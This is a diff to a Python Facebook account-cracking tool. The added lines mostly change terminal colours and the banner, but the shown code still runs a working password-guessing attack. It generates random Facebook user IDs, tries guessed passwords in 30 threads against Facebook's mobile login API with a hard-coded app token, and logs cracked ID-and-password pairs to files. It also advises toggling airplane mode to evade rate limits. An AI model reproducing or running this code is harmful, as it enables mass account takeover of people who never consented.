@@ -119,18 +119,18 @@ def jalan(z):
 def Public():
 	clear()
 	print(logo)
-	print  (' [01] LOG IN WITH TOKEN\n [02] LOG IN WITH COOKIE')
-	pil=input('\n [#] SELECT ONE : ')
+	print  ('\033[94;1m [01] LOG IN WITH TOKEN\n [02] LOG IN WITH COOKIE')
+	pil=input('\n [#] \033[94;1mSELECT ONE : ')
 	if pil in ['1','01']:
 		panda = input(' [+] Token : ')
 		akun=open('.token.txt','w').write(panda)
 		try:
 			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
 			tes3 = json.loads(tes.text)['id']
-			print (" [] LOG IN SUCCESSFUL")
+			print (" \033[91;1m[] LOG IN SUCCESSFUL")
 			login()
 		except KeyError:
-			print( ' [×] LOG IN FAILED ')
+			print( ' \033[91;1m[×] LOG IN FAILED ')
 			time.sleep(2.5)
 			Public()
 		except requests.exceptions.ConnectionError:
@@ -146,7 +146,7 @@ def Public():
 			login()
 		except Exception as e: 
 			os.system("rm -f .token.txt")
-			print( ' [×] LOG IN FAILED ')
+			print( ' \033[91;1m[×] LOG IN FAILED ')
 			time.sleep(2.5)
 			login()
 			exit()
@@ -215,8 +215,8 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] FIRST NAME DIGIT PASS \n [02] ALL NAME PASSWORD \n [03] All Name+ password')
-	passmen=input('\n [#] Select Pass : ')
+	print(logo);print  ('[01] FIRST NAME DIGIT PASS \n [02] ALL NAME PASSWORD \n [03] All Name+ password')
+	passmen=input('\n\033[91;1m [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
 	elif passmen in ['2','02']:
@@ -228,7 +228,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n\033[1;94m [!] CLONING  HAS BEEN START \n\033[1;96m [!] IF no RESULTS TURN ON AIRPLANE MODE FOR 5MINS THEN TURN IT OFF\033[1;0m\n')
+	print(logo);print( '\n\033[91;1m[!] CLONING  HAS BEEN START \n\033[1;96m [!] IF no RESULTS TURN ON AIRPLANE MODE FOR 5MINS THEN TURN IT OFF\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -255,7 +255,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n\033[94;1m [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -275,7 +275,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n\033[91;1m [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[CRACK] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r\033[91;1m%s[CRACK] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[CRACK] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\033[91;1m %s[CRACK] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -372,7 +372,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [BRAITON-OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BRAITON-OK','a').write('%s\n' % wrt)
+				open('/sdcard/BRAITON-OK','a').write('%s\033[91;1m' % wrt)
 				follow(ses,coki)
 				break
  
@@ -388,30 +388,30 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
 logo = """
-===================================================================
+============================================
 || ███╗░░██╗░█████╗░░█████╗░██████╗░║
 || ████╗░██║██╔══██╗██╔══██╗██╔══██╗║
 || ██╔██╗██║██║░░██║██║░░██║██████╦╝║
 || ██║╚████║██║░░██║██║░░██║██╔══██╗║
 || ██║░╚███║╚█████╔╝╚█████╔╝██████╦╝║
    ╚═╝░░╚══╝░╚════╝░░╚════╝░╚═════╝░
-===================================================================
-|| ██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
-|| ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
-|| ███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
-|| ██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
-|| ██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
-   ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝ 
-===================================================================
-\x1b[1;97m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-\33[1;41mTOOL UPDATE, FIRST SEND FRIEND REQUEST \33[0m
-\x1b[1;97m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-\x1b[1;97m░ FACEBOOK  :   MAVIS ZOTHI RIKHOTSO 
-\x1b[1;97m░ GITHUB : BRAITON-KARADAG 
-\x1b[1;97m░ WHATSAPP : +27649365296
-\x1b[1;97m░ TEAM : \33[1;42  SOUL-ARMY\33[0m
-\x1b[1;97m░ VERSION :\x1b[1;97m  1.0.2   \x1b[1;97m          
-\x1b[1;97m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+===========================================
+|| ██╗░░██╗░█████╗░░█████╗░██╗░░██╗
+|| ██║░░██║██╔══██╗██╔══██╗██║░██╔╝
+|| ███████║███████║██║░░╚═╝█████═╝░
+|| ██╔══██║██╔══██║██║░░██╗██╔═██╗
+|| ██║░░██║██║░░██║╚█████╔╝██║░╚██╗
+   ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+==========================================
+\x1b[1;97m░░░░░░░░░░░░░░░░░░░░░░░░░░
+\033[91;1mTOOL UPDATE, FIRST SEND FRIEND REQUEST \33[0m
+\033[91;1m░░░░░░░░░░░░░░░░░░░░░░░░░░
+\033[91;1m░ FACEBOOK  :   MAVIS ZOTHI RIKHOTSO 
+\033[91;1m░ GITHUB : BRAITON-KARADAG 
+\033[91;1m░ WHATSAPP : +27649365296
+\033[91;1m░ TEAM : \33[1;42  SOUL-ARMY\33[0m
+\033[91;1m░ VERSION :\x1b[1;97m  1.0.2   \x1b[1;97m          
+\033[91;1m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 """
  
 class Main:
@@ -424,42 +424,42 @@ class Main:
 		print(logo)
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;37mNOTE : SUBSCRIBE MY YOUTUBE CHANNEL FOR APPROVAL ")
+		print("\033[94;1mNOTE : SUBSCRIBE MY YOUTUBE CHANNEL FOR APPROVAL ")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		
 		
 		print("")
-		print("\033[1;37m [1] FIRST SUBSCRIBE MY YOUTUBE CHANNEL")
-		print("\033[1;37m [2] EXIT")
+		print("\033[94;1m [1] FIRST SUBSCRIBE MY YOUTUBE CHANNEL")
+		print("\033[94;1m [2] EXIT")
 		print("")
-		Baloch = input("\n\033[1;37m  CHOOSE : \033[1;32m")
+		Baloch = input("\033[94;1m CHOOSE : \033[1;32m")
 		if Baloch in ["", " "]:
 			exit()
 		elif Baloch in ["2", "02"]:
-			print("WELL DONE")
+			print("\033[91;1mWELL DONE")
 			exit()
 		elif Baloch in ["1", "01"]:
 			os.system("xdg-open https://youtube.com/channel/UCydePsTftu3YRZJD3HnpPhw")
 			print("")
 			time.sleep(3.0)
-			print("\033[1;37mCHECKING APPROVAL ...... ")
+			print("\033[94;1mCHECKING APPROVAL ...... ")
 			print("")
-			input("\n\033[1;37m WRITE DOWN THE NAME OF MY CHANNEL :  😈\033[1;37m")
+			input("\n\033[94;1m WRITE DOWN THE NAME OF MY CHANNEL :  😈\033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m SUBSCRIBE & LIKE [LAST VIDEO] for more tools ")
+			print("\033[91;1m SUBSCRIBE & LIKE [LAST VIDEO] for more tools ")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
 		print(" ░ MENU METHOD ")
-		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print(" \033[1;32m[1]\033[0;92m FILE CLONING[not working]")
-		print(" \033[1;32m[2] PUBLIC  CLONING[not working]")
-		print(" \33[1;32m[3] PAK RANDOM IDZ CLONING[working]")
-		print(" \033[1;32m[4] 2006 TO 2010 [working]")
-		print(" \33[1;32m[5] 2004 TO 2008 [not working]")
-		print("\033[1;32m [E] EXIT \n")
-		BRAITON =input(" \033[1;32m SELECT ONLY [WORKING] OPTIONS : ")
+		print("\033[94;1m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
+		print(" \033[94;1m[1]\033[0;92m FILE CLONING[not working]")
+		print(" \033[94;1m[2] PUBLIC  CLONING[not working]")
+		print(" \033[94;1m[3] PAK RANDOM IDZ CLONING[working]")
+		print(" \033[94;1m[4] 2006 TO 2010 [working]")
+		print("\033[94;1m[5] 2004 TO 2008 [not working]")
+		print("\033[94;1m [E] EXIT \n")
+		BRAITON =input(" \033[94;1m SELECT ONLY [WORKING] OPTIONS : ")
 		if BRAITON in ["1", "01"]:
 			File()
 		if BRAITON in ["2", "02"]:
@@ -481,28 +481,28 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT :  "))
+		limit = int(input(" \n\033[94;1m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT :  "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\033[91;1m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] Example (123456) as PASSWORD FOR OLD ACCOUNTS\033[1;37m ")
+				print("\n\033[94;1m[!] Example (123456) as PASSWORD FOR OLD ACCOUNTS\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[0;93m WELCOME TO CLONING WORLD ")
-				print("\n\033[0;94m [+] CLONING START......")
-				print(" \033[0;96m[+] 50% ACCOUNTS WILL OPEN ")
-				print("\033[0;94m----------------------------------------------")
+				print("     \033[91;1m WELCOME TO CLONING WORLD ")
+				print("\033[94;1m [+] CLONING START......")
+				print(" \033[94;1m[+] 50% ACCOUNTS WILL OPEN ")
+				print("\033[94;1m----------------------------------------------")
 				print("\n")
-				print("\033[1;37m")
+				print("\033[91;1m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
@@ -874,7 +874,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [+]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\033[91;1m [+]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -918,22 +918,22 @@ class Main:
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\033[94;1m[+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] Example (123456) as PASSWORD FOR OLD ACCOUNTS\033[1;37m ")
+				print("\033[94;1m [!] Example (123456) as PASSWORD FOR OLD ACCOUNTS\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+					exit("\033[94;1m%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+				print("%s [*] CRACK WITH PASSWORD -> %s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[0;93m   WELCOME TO CLONING WORLD ")
-				print("\n\033[0;94m [+] CLONING START")
-				print(" \033[0;96m[+] 50% ACCOUNTS WILL OPEN")
+				print("     \033[91;1m   WELCOME TO CLONING WORLD ")
+				print("\033[94;1m [+] CLONING START")
+				print(" \033[94;1m[+] 50% ACCOUNTS WILL OPEN")
 				print(" [!] IF no RESULTS TURN ON AIRPLANE MODE FOR 5MINS THEN TURN IT OFF")
-				print("\033[0;94m--------------------------------------------")
+				print("\033[94;1m--------------------------------------------")
 				print("\n")
-				print("\033[1;37m")
+				print("\033[91;1m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING OUR TOOL...")
@@ -1322,13 +1322,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[BRAITON-OK] %s | %s\033[0;32m         "%(uid, pw))
-				print ("\r \033[1;32m Congrats ")
+				print("\033[94;1m[BRAITON-OK] %s | %s\033[0;32m         "%(uid, pw))
+				print ("\033[94;1m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("BRAITON-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[BRAITON-OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\033[94;1m[BRAITON-OK] %s | %s\033[94;1m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
